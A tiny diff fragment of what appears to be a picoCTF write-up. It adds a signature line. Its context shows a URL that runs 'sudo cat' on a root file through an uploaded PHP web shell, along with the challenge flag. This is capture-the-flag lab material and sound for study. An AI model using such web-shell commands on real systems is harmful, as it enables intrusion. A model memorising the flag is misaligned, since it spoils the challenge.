@@ -39,3 +39,5 @@ http://standard-pizzas.picoctf.net:63914/uploads/shell.php?cmd=sudo cat /root/fl
 
 The flag is: picoCTF{wh47_c4n_u_d0_wPHP_f7424fc7
 
+Kevin Montes :D
+
